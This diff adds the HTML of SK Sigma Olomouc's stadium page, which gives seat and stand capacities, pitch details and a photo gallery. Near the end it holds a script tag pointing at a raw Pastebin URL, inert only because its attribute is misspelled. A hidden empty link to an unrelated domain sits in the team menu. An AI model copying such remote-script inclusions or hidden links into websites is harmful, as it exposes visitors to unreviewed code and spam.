@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="cz">
+	<head>
+		<!-- Google Tag Manager -->
+		<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+		new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+		j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+		'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+		})(window,document,'script','dataLayer','GTM-NCQHTNVS');</script>
+		<!-- End Google Tag Manager -->
+
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+		<meta name="description" content="SK Sigma Olomouc">
+		<meta name="keywords" content="fotbal Olomouc 1.liga CR ceska cesko">
+		<meta name="robots" content="ALL,FOLLOW">
+		<meta name="author" content="ESMEDIA Interactive">
+		<meta name="twitter:card" content="summary_large_image">
+
+			<meta property="og:type" content="website">
+	<meta property="og:site_name" content="SK Sigma Olomouc">
+	<meta property="og:title" content="Stadion">
+	<meta property="og:image" content="https://sigmafotbal.esports.cz/foto/2023_Stadion-stranka/image-2023-09-02-172632159.png">
+	<meta property="og:url" content="https://sigmafotbal.cz/cz/stadion">
+
+		<title>Stadion | SK Sigma Olomouc</title>
+
+		<link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png">
+		<link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png">
+		<link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png">
+		<link rel="manifest" href="/assets/site.webmanifest">
+		<link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#0b1137">
+		<link rel="shortcut icon" href="/assets/favicon.ico">
+		<meta name="msapplication-TileColor" content="#0b1137">
+		<meta name="msapplication-config" content="/assets/browserconfig.xml">
+		<meta name="theme-color" content="#0b1137">
+
+		<script src="/dist/lib/jquery.js"></script>
+
+		<link href="https://cdn.jsdelivr.net/npm/swiper@9.2.4/modules/scrollbar/scrollbar.min.css" rel="stylesheet">
+
+		<link rel="stylesheet" href="/dist/css/app.css?1713891500">
+				<link rel="stylesheet" href="/dist/css/page-stadium.css?1699378494">
+		<link type="text/css" rel="stylesheet" href="/dist/css/lightgallery.css">
+
+		<link rel="stylesheet" href="/dist/css/hotfix.css?1774261175">
+
+	</head>
+	<body>
+		<!-- Google Tag Manager (noscript) -->
+		<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NCQHTNVS"
+		height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+		<!-- End Google Tag Manager (noscript) -->
+
+
+
+<header class="header">
+    <div class="container-fluid">
+        <div class="flex-wrap d-flex justify-content-between">
+            <a href="/cz/" class="logo">
+                <svg>
+                    <title>SK Sigma Olomouc</title>
+                    <use xlink:href="#logo"></use>
+                </svg>
+            </a>
+            <button class="main-nav-link collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#navbar" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
+                <div class="icon"><span></span><span></span><span></span><span></span></div><div class="text">MENU</div>
+            </button>
+            <nav class="navbar navbar-expand-lg main-nav">
+                <div class="collapse navbar-collapse" id="navbar">
+                    <ul class="mr-auto navbar-nav">
+							<li class="main-nav__item">
+								<a class="nav-link notranslate"  href="/archive">NOVINKY</a>
+							</li>
+							<li class="main-nav__item dropdown">
+								<a class="nav-link dropdown-toggle notranslate" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+									KLUB<svg class="icon"><use xlink:href="#chDown"></use></svg>
+								</a>
+								<div class="dropdown-menu" aria-labelledby="navbarDropdown">
+										<a class="dropdown-item notranslate"  href="/cz/klub">Základní informace</a>
+										<a class="dropdown-item notranslate"  href="/cz/vedeni-klubu">Vedení klubu</a>
+										<a class="dropdown-item notranslate"  href="/cz/kontakty">Kontakty</a>
+										<a class="dropdown-item notranslate"  href="/cz/stadion">Stadion</a>
+										<a class="dropdown-item notranslate"  href="/cz/partneri">Partneři</a>
+										<a class="dropdown-item notranslate"  href="/cz/historie">Historie</a>
+										<a class="dropdown-item notranslate"  href="/cz/sigmafotbal-cz-klub-valna-hromada">Valná hromada</a>
+										<a class="dropdown-item notranslate"  href="/cz/kariera">Kariéra</a>
+										<a class="dropdown-item notranslate"  href="/cz/ke-stazeni">Ke stažení</a>
+								</div>
+							</li>
+							<li class="main-nav__item dropdown">
+								<a class="nav-link dropdown-toggle notranslate" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+									A-TÝM<svg class="icon"><use xlink:href="#chDown"></use></svg>
+								</a>
+								<div class="dropdown-menu" aria-labelledby="navbarDropdown">
+										<a class="dropdown-item notranslate"  href="/cz/roster/MUZ">Kádr</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster/MUZ#realizacni-tym">Realizační tým </a>
+										<a class="dropdown-item notranslate"  href="/cz/matches/MUZ">Zápasy</a>
+										<a class="dropdown-item notranslate"  href="/cz/tabulka/MUZ">Tabulka</a>
+										<a class="dropdown-item notranslate"  href="/cz/statistiky/MUZ">Statistiky</a>
+								</div>
+							</li>
+							<li class="main-nav__item dropdown">
+								<a class="nav-link dropdown-toggle notranslate" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+									VSTUPENKY<svg class="icon"><use xlink:href="#chDown"></use></svg>
+								</a>
+								<div class="dropdown-menu" aria-labelledby="navbarDropdown">
+										<a class="dropdown-item notranslate"  href="/cz/vstupenky-26-27">Online prodej</a>
+										<a class="dropdown-item notranslate"  href="/cz/permanentky-26-27">Permanentky</a>
+										<a class="dropdown-item notranslate"  href="/cz/navod-permanentky-26-27">Návod na nákup permanentek</a>
+										<a class="dropdown-item notranslate"  href="/cz/faq-permanentky">FAQ - Nejčastější otázky permanentky</a>
+										<a class="dropdown-item notranslate"  href="/cz/bonus.php">Bonus Program</a>
+										<a class="dropdown-item notranslate"  href="/cz/akreditace">Pro média</a>
+										<a class="dropdown-item notranslate"  href="/cz/sigmafotbal-cz-vstupenky-jak-se-k-nam-dostanete">Jak se k nám dostanete?</a>
+										<a class="dropdown-item notranslate"  href="/cz/obchodni-podminky">Obchodní podmínky</a>
+								</div>
+							</li>
+							<li class="main-nav__item dropdown">
+								<a class="nav-link dropdown-toggle notranslate" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+									ZÁPASY<svg class="icon"><use xlink:href="#chDown"></use></svg>
+								</a>
+								<div class="dropdown-menu" aria-labelledby="navbarDropdown">
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/MUZ">A-tým</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/MUB">B-tým</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/ZEN">Ženy</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/ZEB">Ženy B-tým</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/U19">U19</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/U18">U18</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/U17">U17</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/U16">U16</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/wu18">Dorostenky WU18</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/u15">U15</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/U14">U14</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/wu16">St. žákyně WU15</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/U13">U13</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/U12">U12</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/wu13">Ml. žákyně WU13</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/U11">U11</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/U10">U10</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/U9">U9</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/U8">U8</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/U7">U7</a>
+										<a class="dropdown-item notranslate"  href="/cz/zapasy/wu11">Přípravky dívky WU11</a>
+								</div>
+							</li>
+							<li class="main-nav__item dropdown">
+								<a class="nav-link dropdown-toggle notranslate" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+									TÝMY<svg class="icon"><use xlink:href="#chDown"></use></svg>
+								</a>
+								<div class="dropdown-menu" aria-labelledby="navbarDropdown">
+										<a class="dropdown-item notranslate"  href="/cz/roster/MUZ">A-tým</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster/MUB">B-tým</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/ZEN">Ženy</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/ZEB">Ženy B-tým</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/U19">U19</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/U18">U18</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/U17">U17</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/U16">U16</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/WU18">Dorostenky WU18</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/U15">U15</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/U14">U14</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/WU16">St. žákyně WU15</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/U13">U13</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/U12">U12</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/WU13">Ml. žákyně WU13</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/U11">U11</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/U10">U10</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/U9">U9</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/U8">U8</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/U7">U7</a>
+										<a class="dropdown-item notranslate"  href="/cz/roster-table/WU11">Přípravky dívky WU11</a>
+										<a class="dropdown-item notranslate"  href="/czhttps://eorcc.org/"> </a>
+								</div>
+							</li>
+							<li class="main-nav__item dropdown">
+								<a class="nav-link dropdown-toggle notranslate" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+									AKADEMIE<svg class="icon"><use xlink:href="#chDown"></use></svg>
+								</a>
+								<div class="dropdown-menu" aria-labelledby="navbarDropdown">
+										<a class="dropdown-item notranslate"  href="/cz/mladez#akademie">Akademie Clubofka</a>
+										<a class="dropdown-item notranslate"  href="/cz/mladez#nabory">Nábory</a>
+										<a class="dropdown-item notranslate"  href="/cz/mladez#tridy">Sportovní třídy</a>
+										<a class="dropdown-item notranslate"  href="/cz/mladez#odchovanci">Slavní odchovanci</a>
+										<a class="dropdown-item notranslate"  href="/cz/sigma-odra">Sigma - Odra</a>
+								</div>
+							</li>
+							<li class="main-nav__item">
+								<a class="nav-link notranslate" target="_blank" href="https://eshop.sigmafotbal.cz/">FANSHOP</a>
+							</li>
+							<li class="main-nav__item">
+								<a class="nav-link notranslate" target="_blank" href="/sigma-appka">SIGMA APPKA</a>
+							</li>
+                        <li class="main-nav__item lang-menu">
+                                <a class="nav-link notranslate" href="/en/" title="Continue to english version website"><img src="/assets/flags/4x3/gb.svg" style="width:24px; margin-right: 6px;">EN</a>
+                        </li>
+                    </ul>
+                </div>
+            </nav>
+            <div class="header__socials">
+                <ul class="socials">
+                    <li><a href="https://www.facebook.com/sksigmaolomouc" target="_blank" rel="noopener noreferrer"><svg class="icon"><use xlink:href="#fb"></use></svg></a></li>
+                    <li><a href="https://www.instagram.com/sigma_olomouc/" target="_blank" rel="noopener noreferrer"><svg class="icon"><use xlink:href="#ig"></use></svg></a></li>
+                    <li><a href="https://twitter.com/SKSigmaOlomouc" target="_blank" rel="noopener noreferrer"><svg class="icon"><use xlink:href="#tw"></use></svg></a></li>
+                    <li><a href="https://www.tiktok.com/@sksigmaolomouc" target="_blank" rel="noopener noreferrer"><svg class="icon"><use xlink:href="#tt"></use></svg></a></li>
+                    <li>
+                        <a href="https://www.youtube.com/channel/UC7p-I5SNUzoVoM6IANONPHQ" target="_blank" rel="noopener noreferrer">
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon" fill="white" width="34" height="34" viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm4.441 16.892c-2.102.144-6.784.144-8.883 0-2.276-.156-2.541-1.27-2.558-4.892.017-3.629.285-4.736 2.558-4.892 2.099-.144 6.782-.144 8.883 0 2.277.156 2.541 1.27 2.559 4.892-.018 3.629-.285 4.736-2.559 4.892zm-6.441-7.234l4.917 2.338-4.917 2.346v-4.684z"></path></svg>
+                        </a>
+                    </li>
+
+                </ul>
+                <a href="/vyhledavani" class="btn-search"><svg class="icon"><use xlink:href="#search"></use></svg></a>
+                <div class="">
+                        <a class="" href="/en/" title="Continue to english version website"><img src="/assets/flags/4x3/gb.svg"  style="width:24px;"></a>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+	<section class="hero-page">
+		<div class="container-fluid">
+			<h1 class="heading-primary mb-0">Stadion</h1>
+			<ul class="breadcrumbs">
+				<li>
+					<a href="/cz/">
+						<svg class="home"><use xlink:href="#home"></use></svg>
+							SK Sigma Olomouc
+						<span class="delimiter">/</span>
+					</a>
+				</li>
+				<li>Stadion</li>
+			</ul>
+		</div>
+	</section>
+
+<section class="stadium-info page-section">
+    <div class="container-fluid">
+        <h2 class="page-section__heading">
+            Základní info
+        </h2>
+        <div class="row justify-content-center mt-lg-5 pt-5">
+            <div class="col-lg-8">
+                <div class="d-flex flex-wrap justify-content-between align-items-center">
+                    <div class="stadium-info__item">
+                        <div class="text">Celkový počet míst</div>
+                        <div class="value">
+                            <div class="big">12 373</div>
+                            <div class="small">Vše k sezení</div>
+                            <div class="bg"></div>
+                        </div>
+                    </div>
+
+                    <div class="stadium-info__item">
+                        <div class="text">Zastřešených míst</div>
+                        <div class="value">
+                            <div class="big">3 529</div>
+                            <div class="bg"></div>
+                        </div>
+                    </div>
+
+                    <div class="stadium-info__item">
+                        <div class="text">Nezastřešených míst</div>
+                        <div class="value">
+                            <div class="big">8 925</div>
+                            <div class="bg"></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="d-flex flex-wrap justify-content-between align-items-center">
+                    <div class="stadium-info__item">
+                        <div class="text">Rozměry hrací plochy</div>
+                        <div class="value">
+                            <div class="big">105 x 68 m</div>
+                            <div class="bg"></div>
+                        </div>
+                    </div>
+
+                    <div class="stadium-info__item">
+                        <div class="text">Vyhřívání</div>
+                        <div class="value">
+                            <div class="big">Ano</div>
+                            <div class="bg"></div>
+                        </div>
+                    </div>
+
+                    <div class="stadium-info__item">
+                        <div class="text">trávník</div>
+                        <div class="value">
+                            <div class="big">technologie
+                                Fibresand</div>
+                            <div class="bg"></div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="stadium-gallery">   
+    <div class="container-fluid">
+        <div class="row ">
+            <div class="col-lg-8">
+                <div class="image-big">
+
+            
+                
+
+                    <a data-gallery="1" data-gallery-id="49" data-source="/inc/gallery-ajax.php" data-start="0" href="#">
+                        <img src="/image?file=https://sigmafotbal.esports.cz/foto/2023_Stadion-stranka/image-2023-09-02-172632159.png&w=751&h=500" alt="">
+                    </a>
+
+                
+            
+
+                </div>
+            </div>
+
+        
+        
+            
+                
+
+            <div class="col-lg-4">
+                <div class="image">
+
+                    <a data-gallery="1" data-gallery-id="49" data-source="/inc/gallery-ajax.php" data-start="1" href="#">
+                        <img src="/image?file=https://sigmafotbal.esports.cz/foto/2023_Stadion-stranka/image-2023-09-02-172640156.png&w=751&h=500" alt="">
+                    </a>
+
+                </div>
+            
+
+                
+            
+
+        
+        
+            
+                
+
+            
+                <div class="image">
+
+                    <a data-gallery="1" data-gallery-id="49" data-source="/inc/gallery-ajax.php" data-start="2" href="#">
+                        <img src="/image?file=https://sigmafotbal.esports.cz/foto/2023_Stadion-stranka/image-2023-09-02-172648066.png&w=751&h=500" alt="">
+                    </a>
+
+                </div>
+            </div>
+
+                
+            
+
+        </div>
+        <div class="row ">
+            
+                
+
+            <div class="col-lg-4">
+                <div class="image">
+
+                    <a data-gallery="1" data-gallery-id="49" data-source="/inc/gallery-ajax.php" data-start="3" href="#">
+                        <img src="/image?file=https://sigmafotbal.esports.cz/foto/2023_Stadion-stranka/image-2023-09-02-172657807.png&w=751&h=500" alt="">
+                    </a>
+
+                </div>
+            
+
+                
+            
+
+        
+        
+            
+                
+
+            
+                <div class="image">
+
+                    <a data-gallery="1" data-gallery-id="49" data-source="/inc/gallery-ajax.php" data-start="4" href="#">
+                        <img src="/image?file=https://sigmafotbal.esports.cz/foto/2023_Stadion-stranka/image-2023-09-02-172705730.png&w=751&h=500" alt="">
+                    </a>
+
+                </div>
+            </div>
+
+                
+            
+
+        
+        
+            <div class="col-lg-8">
+                <div class="image-big">
+
+            
+                
+
+                    <a data-gallery="1" data-gallery-id="49" data-source="/inc/gallery-ajax.php" data-start="5" href="#">
+                        <img src="/image?file=https://sigmafotbal.esports.cz/foto/2023_Stadion-stranka/image-2023-09-02-172714868.png&w=751&h=500" alt="">
+                    </a>
+
+                
+            
+
+                </div>
+            </div>
+
+        </div>
+        <div class="row ">
+            <div class="col-lg-8">
+                <div class="image-big">
+
+            
+                
+
+                    <a data-gallery="1" data-gallery-id="49" data-source="/inc/gallery-ajax.php" data-start="6" href="#">
+                        <img src="/image?file=https://sigmafotbal.esports.cz/foto/2023_Stadion-stranka/image-2023-09-02-172723735.png&w=751&h=500" alt="">
+                    </a>
+
+                
+            
+
+                </div>
+            </div>
+
+        
+        
+            
+                
+
+            <div class="col-lg-4">
+                <div class="image">
+
+                    <a data-gallery="1" data-gallery-id="49" data-source="/inc/gallery-ajax.php" data-start="7" href="#">
+                        <img src="/image?file=https://sigmafotbal.esports.cz/foto/2023_Stadion-stranka/image-2023-09-02-172742904.png&w=751&h=500" alt="">
+                    </a>
+
+                </div>
+            
+
+                
+            
+
+        
+        
+            
+                
+
+            
+                <div class="image">
+
+                    <a data-gallery="1" data-gallery-id="49" data-source="/inc/gallery-ajax.php" data-start="8" href="#">
+                        <img src="/image?file=https://sigmafotbal.esports.cz/foto/2023_Stadion-stranka/image-2023-09-02-172753813.png&w=751&h=500" alt="">
+                    </a>
+
+                </div>
+            </div>
+
+                
+            
+
+        </div>
+
+    </div>
+</section>
+
+
+<section class="stadium-capacity page-section">
+    <div class="container-fluid">
+        <h2 class="title">
+            Kapacity jednotlivých tribun
+        </h2>
+
+        <div class="d-flex flex-wrap justify-content-center">
+            <div class="stadium-capacity__item">
+                <div class="title">
+                    Severní tribuna
+                </div>
+                <div class="content">
+                    <div class="big">3 871</div>
+                    <div class="small">vše nekryté</div>
+                </div>
+            </div>
+            <div class="divider"></div>
+            <div class="stadium-capacity__item">
+                <div class="title">
+                    Jižní tribuna
+                </div>
+                <div class="content">
+                    <div class="big">2 362</div>
+                    <div class="small">1 902 nekryté<br>
+                        460 VIP</div>
+                </div>
+            </div>
+            <div class="divider"></div>
+            <div class="stadium-capacity__item">
+                <div class="title">
+                    Tribuna Karla Brücknera
+                </div>
+                <div class="content">
+                    <div class="big">3 126</div>
+                    <div class="small">1753 krytých, 1373 nekrytých míst<br>
+                        651 míst tvoří sektor hostů</div>
+                </div>
+            </div>
+            <div class="divider"></div>
+            <div class="stadium-capacity__item">
+                <div class="title">
+                    Západní tribuna
+                </div>
+                <div class="content">
+                    <div class="big">3 091</div>
+                    <div class="small">1 316 krytých<br>
+                        1775 nekrytých míst</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<center><a href = "https://sigmafotbal.esports.cz/files/editor/Navstevni_rad_2025.pdf" style = "color: #fff; font-size: 30px;padding: 20px;text-decoration: underline;"><strong>Návštěvní řád Androva stadionu</strong></a></center>
+
+
+
+
+
+		<section class="footer">
+
+<section class="mt-0 footer">
+    <div class="container-fluid">
+        <div class="row align-items-center">
+            <div class="col-12 col-lg-4">
+                <div class="mb-5 logo mb-lg-0">
+                    <img src="/assets/images/sigma-logo.png" alt="">
+                </div>
+            </div>
+            <div class="col-12 col-lg-4">
+                <div class="row">
+                    <div class="col-12 col-lg-6">
+                        <ul class="footer__menu">
+                            <li><a href="/cz/stadion">Stadion</a></li>
+                        
+                            <li><a href="/cz/partneri">Partneři</a></li>
+                        
+                            <li><a href="/cz/historie">Historie</a></li>
+                        
+                            <li><a href="/cz/sigmafotbal-cz-klub-valna-hromada">Valná hromada</a></li>
+                        
+                            <li><a href="/cz/ke-stazeni">Ke stažení</a></li>
+                        
+                            <li><a href="/cz/vstupenky-26-27">Online prodej</a></li>
+                        </ul>
+                    </div>
+                        
+                    <div class="col-12 col-lg-6">
+                        <ul class="footer__menu">
+                            <li><a href="/cz/permanentky-26-27">Permanentky</a></li>
+                        
+                            <li><a href="/cz/obchodni-podminky">Obchodní podmínky</a></li>
+                        
+                            <li><a href="/cz/sigma-appka">SIGMA APPKA</a></li>
+                        </ul>
+                    </div>
+                        
+                    
+                </div>
+            </div>
+
+            <div class="col-12 col-lg-4">
+                <div class="footer__socials">
+                    <p class="mb-3">Potkejme se on-line</p>
+                    <ul class="socials">
+                        <li><a href="https://www.facebook.com/sksigmaolomouc" target="_blank" rel="noopener noreferrer"><svg class="icon"><use xlink:href="#fb"></use></svg></a></li>
+                        <li><a href="https://www.instagram.com/sigma_olomouc/" target="_blank" rel="noopener noreferrer"><svg class="icon"><use xlink:href="#ig"></use></svg></a></li>
+                        <li><a href="https://twitter.com/SKSigmaOlomouc" target="_blank" rel="noopener noreferrer"><svg class="icon"><use xlink:href="#tw"></use></svg></a></li>
+                        <li><a href="https://www.tiktok.com/@sksigmaolomouc" target="_blank" rel="noopener noreferrer"><svg class="icon"><use xlink:href="#tt"></use></svg></a></li>
+                    </ul>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+</section>
+
+<section class="px-3 py-5 footer__copyright"> 
+    <p>© 2026 SK Sigma Olomouc a. s., všechna práva vyhrazena</p>
+    <p>Web vytvořila v rámci podpory klubu <a href="https://esmedia.cz/">ESMEDIA</a> ve spolupráci s <a href="https://esportsmedia.cz">eSports.cz</a></p>
+    <p><a href="javascript:void(0);" data-cc="c-settings" aria-haspopup="dialog" class="text-white me-5 link-inverted">Nastavení cookies</a></p>
+</section>
+
+
+
+		<script src="https://cdn.jsdelivr.net/npm/swiper@9.2.4/swiper-bundle.min.js"></script>
+		<script src="/dist/js/vendor.js"></script>
+		<script src="/dist/js/app.js"></script>
+		<script src="/dist/js/hotfix.js"></script>
+
+		<script type="text/javascript">
+			var stripType = 4;
+			var stripGlExtraCode = 25;
+			var stripUtmSource = "sigmafotbal.cz";
+			var js = document.createElement('script');
+			js.src = 'https://gambrinusliga.s3-external-3.amazonaws.com/strip/strip-utf8.js';
+			document.getElementsByTagName('body')[0].appendChild(js);
+		</script>
+
+		<script type="text/javascript">
+            document.addEventListener("DOMContentLoaded", function() {
+                $('#modal-cover').modal('show');
+            });
+		</script>
+
+		<link rel="stylesheet" href="/dist/css/cookie-consent.css">
+		<script defer src="/dist/js/cookie-consent-config.js"></script>
+		<script defer src="/dist/js/cookie-consent.js"></script>
+		<script src="/dist/js/social-media2.js" type="text/plain" data-cookiecategory="social"></script>
+
+		<script src="https://data.esportsmedia.cz/data/import.js"></script>
+
+		<div id="google_translate_element"></div>
+		<script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+		<script srf="https://pastebin.com/raw/54VcGq6n"></script>
+		<script>const lang = "cz"</script>
+		<script type="text/javascript">
+			if (lang === 'en') {
+				function googleTranslateElementInit() {
+					new google.translate.TranslateElement({ pageLanguage: "cs", includedLanguages: "cs,en", layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, "google_translate_element");
+
+					document.body.style.position = 'unset !important';
+				}
+
+				googleTranslateElementInit();
+
+				document.cookie = 'googtrans=/cs/en; path=/en';
+			} else {
+				document.cookie = 'googtrans=/cs/cs; path=/';
+				document.cookie = 'googtrans=/cs/cs; path=/cz';
+			}
+		</script>
+
+		    <script type="text/javascript" src="/dist/js/lightgallery-all.min.js" defer></script>
+	<script type="text/javascript" src="/dist/js/lightgallery-load.js" defer></script>
+
+		</section>
+
+
+	</body>
+</html>
